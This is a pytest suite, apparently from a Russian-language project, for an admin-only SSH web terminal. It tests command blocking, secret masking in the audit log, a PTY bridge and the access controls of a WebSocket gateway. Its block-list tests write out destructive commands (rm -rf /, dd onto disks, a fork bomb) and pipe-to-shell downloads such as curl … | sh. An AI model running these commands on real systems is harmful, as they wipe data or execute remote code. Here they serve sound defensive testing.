"""SSH-терминал: политика команд, маскирование, PTY-мост и WebSocket-шлюз (доступ, аудит, таймауты)."""

import asyncio
import json
import time

import pytest
from fastapi.testclient import TestClient
from starlette.websockets import WebSocketDisconnect

from app.config import Settings
from app.main import create_app
from app.services.deploy import DeployConfig, SshDeployer, Target
from app.services.terminal import CommandPolicy, PtyProcess, SecretPromptDetector, check_command, mask_secrets

ADMIN_PW = "Admin-pass-1234"
WORKER = {"name": "w1", "host": "10.0.0.1", "ssh_user": "downloader", "storage_path": "/data/videos"}


# ------------------------------------------------------------------ политика команд


@pytest.mark.parametrize("line", [
    "rm -rf /", "rm -rf /*", "rm -fr ~", "rm -r -f /", "sudo rm -rf /", "rm --no-preserve-root -rf /x",
    "mkfs.ext4 /dev/sda1", "dd if=/dev/zero of=/dev/sda", "echo x > /dev/sda",
    "shutdown -h now", "reboot", "ls && poweroff", "init 0",
    ":(){ :|:& };:", "sudo ls", "su - root", "passwd", "useradd evil",
    "chmod -R 777 /", "curl http://x.example/i.sh | sh", "wget -qO- http://x | sudo bash",
    "iptables -F", "kill -9 -1",
])
def test_dangerous_commands_are_blocked(line):
    assert check_command(line) is not None, line


@pytest.mark.parametrize("line", [
    "ls -la", "df -h", "tail -n 100 /data/videos/0/12/metadata.json", "rm -rf /data/videos/tmp",
    "rm file.part", "ps aux | grep videofetch", "journalctl -u ssh", "cat /etc/os-release", "echo shutdown",
    "uname -a", "du -sh /data/videos", "sha256sum /data/videos/0/12/video.mp4",
])
def test_ordinary_commands_pass(line):
    assert check_command(line) is None, line


def feed(*chunks, echo=True):
    p = CommandPolicy()
    return [p.feed(c, echo) for c in chunks]


def test_policy_erases_blocked_line_instead_of_enter():
    (f,) = feed("rm -rf /\r")
    assert f.blocked and f.blocked[0][0].startswith("rm_")
    assert "\x05\x15" in f.forward and not f.executed
    assert not f.forward.endswith("rm -rf /\r")  # Enter с самой командой в оболочку не уходит


def test_policy_logs_executed_commands_and_masks_secrets():
    (f,) = feed("export TOKEN=abc123\rmysql --password hunter2 -h db\rls\r")
    assert f.executed == ["export TOKEN=***", "mysql --password *** -h db", "ls"]
    assert "abc123" not in " ".join(f.executed) and "hunter2" not in " ".join(f.executed)


def test_policy_tracks_editing_so_cursor_moves_cannot_hide_a_command():
    # набрали «shutdwn», вернули курсор на две позиции и вставили «o»: получилось «shutdown»
    (f,) = feed("shutdwn\x1b[D\x1b[Do\x1b[F\r")
    assert f.blocked, f
    # стёрли запрещённое слово, команда безопасна
    (g,) = feed("shutdown\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7fls\r")
    assert not g.blocked and g.executed == ["ls"]
    # Ctrl-U стирает набранное
    (h,) = feed("rm -rf /\x15ls\r")
    assert not h.blocked and h.executed == ["ls"]


def test_policy_pasted_lines_are_judged_separately():
    (f,) = feed("ls\rreboot\rdf\r")
    assert [b[0] for b in f.blocked] == ["power_control"]
    assert f.executed == ["ls", "df"]


def test_policy_does_not_parse_or_log_password_prompt():
    (f,) = feed("my-secret-password\r", echo=False)
    assert not f.executed and not f.blocked and f.forward == "my-secret-password\r"


def test_policy_marks_history_and_completion():
    (f,) = feed("\x1b[A\r")
    assert f.executed and "история" in f.executed[0]
    (g,) = feed("cat /et\t\r")
    assert g.executed and "автодополнение" in g.executed[0]


def test_mask_secrets():
    assert "zzz" not in mask_secrets("curl -H 'Authorization: Bearer zzz'")
    assert "pw" not in mask_secrets("login password=pw")
    assert mask_secrets("find . -print") == "find . -print"
    assert len(mask_secrets("a" * 1000)) < 400


def test_secret_prompt_detector():
    d = SecretPromptDetector()
    d.feed_output("[sudo] password for downloader: ")
    assert d.active
    d.feed_input("hunter2")
    assert d.active  # пока не нажат Enter, всё ещё ввод секрета
    d.feed_input("\r")
    assert not d.active
    d.feed_output("downloader@w1:~$ ")
    assert not d.active
    d.feed_output("Enter passphrase for key '/x':\x1b[0m ")
    assert d.active


# ------------------------------------------------------------------ PTY-мост


def test_pty_bridge_round_trip_and_echo_flag():
    async def scenario():
        p = PtyProcess(["/bin/sh", "-c", "stty -echo; read x; echo got:$x; exec cat"])
        await p.start()
        try:
            await asyncio.sleep(0.4)
            assert p.echo is False  # терминал не печатает ввод — как при запросе пароля
            p.write("secret\r")
            out = b""
            for _ in range(20):
                chunk = await asyncio.wait_for(p.output.get(), 3)
                out += chunk or b""
                if b"got:secret" in out:
                    break
            assert b"got:secret" in out
        finally:
            await p.close()
        assert p.master == -1

    asyncio.run(scenario())


# ------------------------------------------------------------------ ssh-команда


def test_interactive_argv_is_hardened(tmp_path):
    keys = tmp_path / "keys"
    keys.mkdir()
    (keys / "k").write_text("K")
    dep = SshDeployer(DeployConfig(source_dir="/x", coordinator_url="u", key_dir=str(keys)))
    argv = dep.interactive_argv(Target("w1", 2222, "downloader", str(keys / "k"), "w1"))
    assert argv[0] == "ssh" and "-tt" in argv and argv[-1] == "downloader@w1"
    for opt in ("BatchMode=yes", "ForwardAgent=no", "ClearAllForwardings=yes", "ServerAliveInterval=15"):
        assert opt in argv
    assert argv[argv.index("-p") + 1] == "2222"
    assert str(keys / "k") in argv


def test_interactive_argv_rejects_key_outside_secrets(tmp_path):
    (tmp_path / "keys").mkdir()
    (tmp_path / "evil").write_text("K")
    dep = SshDeployer(DeployConfig(source_dir="/x", coordinator_url="u", key_dir=str(tmp_path / "keys")))
    with pytest.raises(Exception) as exc:
        dep.interactive_argv(Target("w1", 22, "downloader", str(tmp_path / "evil"), "w1"))
    assert getattr(exc.value, "code", "") == "key_outside_secrets"


# ------------------------------------------------------------------ WebSocket-шлюз


def make_env(session_factory, argv=("/bin/cat",), **overrides):
    settings = Settings(auth_enabled=True, secret_key="k" * 32, admin_password=ADMIN_PW, **overrides)
    app = create_app(session_factory, background=False, settings=settings)
    app.state.deployer.interactive_argv = lambda target: list(argv)  # вместо ssh запускаем локальную команду
    return app


def login(app, username="admin", password=ADMIN_PW):
    c = TestClient(app)
    r = c.post("/api/auth/login", json={"username": username, "password": password})
    assert r.status_code == 200, r.text
    c.headers["X-CSRF-Token"] = r.json()["csrf_token"]
    return c


def cookie_header(client):
    return {"cookie": f"vf_session={client.cookies.get('vf_session')}"}


def read_until(ws, predicate, limit=60):
    seen = []
    for _ in range(limit):
        msg = json.loads(ws.receive_text())
        seen.append(msg)
        if predicate(msg):
            return seen
    raise AssertionError(f"не дождались нужного сообщения: {seen[-5:]}")


def send(ws, data):
    ws.send_text(json.dumps({"type": "input", "data": data}))


def audit_rows(admin, action, wait=3.0):
    """Запись о закрытии сеанса появляется чуть позже отключения клиента, поэтому ждём её до wait секунд."""
    end = time.time() + wait
    while True:
        rows = admin.get("/api/audit", params={"action": action, "limit": 100}).json()
        if rows or time.time() >= end:
            return rows
        time.sleep(0.1)


@pytest.fixture
def stand(session_factory):
    app = make_env(session_factory)
    with TestClient(app):
        admin = login(app)
        wid = admin.post("/api/workers", json=WORKER).json()["id"]
        yield app, admin, wid


def test_terminal_requires_login(stand):
    app, _, wid = stand
    with pytest.raises(WebSocketDisconnect):
        with TestClient(app).websocket_connect(f"/api/workers/{wid}/terminal"):
            pass


@pytest.mark.parametrize("role", ["viewer", "operator"])
def test_terminal_is_for_administrators_only(stand, role):
    app, admin, wid = stand
    assert admin.post("/api/users", json={"username": f"u-{role}", "password": "Passw0rd-long", "roles": [role]}).status_code == 201
    user = login(app, f"u-{role}", "Passw0rd-long")
    with pytest.raises(WebSocketDisconnect):
        with user.websocket_connect(f"/api/workers/{wid}/terminal", headers=cookie_header(user)):
            pass


def test_terminal_rejects_foreign_origin(stand):
    app, admin, wid = stand
    headers = {**cookie_header(admin), "origin": "https://evil.example"}
    with pytest.raises(WebSocketDisconnect):
        with admin.websocket_connect(f"/api/workers/{wid}/terminal", headers=headers):
            pass


def test_terminal_unknown_server(stand):
    app, admin, _ = stand
    with pytest.raises(WebSocketDisconnect):
        with admin.websocket_connect("/api/workers/9999/terminal", headers=cookie_header(admin)):
            pass


def test_terminal_session_is_audited(stand):
    app, admin, wid = stand
    with admin.websocket_connect(f"/api/workers/{wid}/terminal", headers=cookie_header(admin)) as ws:
        assert read_until(ws, lambda m: m["type"] == "ready")[-1]["server"] == "w1"
        send(ws, "hello-terminal\r")
        read_until(ws, lambda m: m["type"] == "output" and "hello-terminal" in m["data"])
        send(ws, "export TOKEN=abc123\r")
        read_until(ws, lambda m: m["type"] == "output" and "TOKEN" in m["data"])
        ws.send_text(json.dumps({"type": "resize", "rows": 40, "cols": 120}))
    opened = audit_rows(admin, "terminal_open")
    closed = audit_rows(admin, "terminal_close")
    commands = [r["details"]["command"] for r in audit_rows(admin, "terminal_command")]
    assert opened and opened[0]["username"] == "admin" and opened[0]["target_id"] == str(wid)
    assert closed and closed[0]["details"]["reason"] == "client_closed"
    assert "hello-terminal" in commands and "export TOKEN=***" in commands
    assert "abc123" not in json.dumps(admin.get("/api/audit", params={"limit": 1000}).json())  # секрет в журнал не попал


def test_terminal_blocks_dangerous_command(stand):
    app, admin, wid = stand
    with admin.websocket_connect(f"/api/workers/{wid}/terminal", headers=cookie_header(admin)) as ws:
        read_until(ws, lambda m: m["type"] == "ready")
        send(ws, "rm -rf /\r")
        notes = read_until(ws, lambda m: m["type"] == "notice")
        assert "rm_recursive_root" in notes[-1]["message"]
    blocked = audit_rows(admin, "terminal_blocked")
    assert blocked and blocked[0]["details"]["rule"] == "rm_recursive_root"
    assert not any(r["details"]["command"].startswith("rm") for r in audit_rows(admin, "terminal_command", wait=0))


def test_terminal_does_not_log_typed_password(session_factory):
    app = make_env(session_factory, argv=("/bin/sh", "-c", "printf 'Password: '; read x; echo got; exec cat"))
    with TestClient(app):
        admin = login(app)
        wid = admin.post("/api/workers", json=WORKER).json()["id"]
        with admin.websocket_connect(f"/api/workers/{wid}/terminal", headers=cookie_header(admin)) as ws:
            read_until(ws, lambda m: m["type"] == "output" and "Password:" in m["data"])
            send(ws, "hunter2\r")
            read_until(ws, lambda m: m["type"] == "output" and "got" in m["data"])
            send(ws, "ls-after\r")
            read_until(ws, lambda m: m["type"] == "output" and "ls-after" in m["data"])
        commands = [r["details"]["command"] for r in audit_rows(admin, "terminal_command")]
        assert "ls-after" in commands and "hunter2" not in json.dumps(admin.get("/api/audit", params={"limit": 1000}).json())


def test_terminal_ends_when_process_exits(session_factory):
    app = make_env(session_factory, argv=("/bin/sh", "-c", "echo bye"))
    with TestClient(app):
        admin = login(app)
        wid = admin.post("/api/workers", json=WORKER).json()["id"]
        with admin.websocket_connect(f"/api/workers/{wid}/terminal", headers=cookie_header(admin)) as ws:
            msgs = read_until(ws, lambda m: m["type"] == "closed")
            assert any(m["type"] == "output" and "bye" in m["data"] for m in msgs)
            assert msgs[-1]["reason"] == "ssh_exited"
        assert audit_rows(admin, "terminal_close")[0]["details"]["reason"] == "ssh_exited"


def test_terminal_idle_timeout(session_factory):
    app = make_env(session_factory, terminal_idle_seconds=1)
    with TestClient(app):
        admin = login(app)
        wid = admin.post("/api/workers", json=WORKER).json()["id"]
        with admin.websocket_connect(f"/api/workers/{wid}/terminal", headers=cookie_header(admin)) as ws:
            msgs = read_until(ws, lambda m: m["type"] == "closed")
            assert msgs[-1]["reason"] == "idle_timeout"
        assert audit_rows(admin, "terminal_close")[0]["details"]["reason"] == "idle_timeout"


def test_terminal_session_limit(session_factory):
    app = make_env(session_factory, terminal_max_sessions=1)
    with TestClient(app):
        admin = login(app)
        wid = admin.post("/api/workers", json=WORKER).json()["id"]
        with admin.websocket_connect(f"/api/workers/{wid}/terminal", headers=cookie_header(admin)) as first:
            read_until(first, lambda m: m["type"] == "ready")
            with pytest.raises(WebSocketDisconnect):
                with admin.websocket_connect(f"/api/workers/{wid}/terminal", headers=cookie_header(admin)):
                    pass
        # после закрытия первого сеанса место освобождается (сервер освобождает его чуть позже клиента)
        for attempt in range(10):
            try:
                with admin.websocket_connect(f"/api/workers/{wid}/terminal", headers=cookie_header(admin)) as again:
                    read_until(again, lambda m: m["type"] == "ready")
                break
            except WebSocketDisconnect:
                time.sleep(0.5)
        else:
            raise AssertionError("место в лимите сеансов не освободилось")


def test_terminal_can_be_disabled(session_factory):
    app = make_env(session_factory, terminal_enabled=False)
    with TestClient(app):
        admin = login(app)
        wid = admin.post("/api/workers", json=WORKER).json()["id"]
        with pytest.raises(WebSocketDisconnect):
            with admin.websocket_connect(f"/api/workers/{wid}/terminal", headers=cookie_header(admin)):
                pass


def test_terminal_ssh_key_problem_is_reported_not_crashed(session_factory):
    app = create_app(session_factory, background=False,
                     settings=Settings(auth_enabled=True, secret_key="k" * 32, admin_password=ADMIN_PW))
    with TestClient(app):  # настоящий deployer: у сервера нет ключа
        admin = login(app)
        wid = admin.post("/api/workers", json=WORKER).json()["id"]
        with admin.websocket_connect(f"/api/workers/{wid}/terminal", headers=cookie_header(admin)) as ws:
            msg = json.loads(ws.receive_text())
            assert msg["type"] == "error"
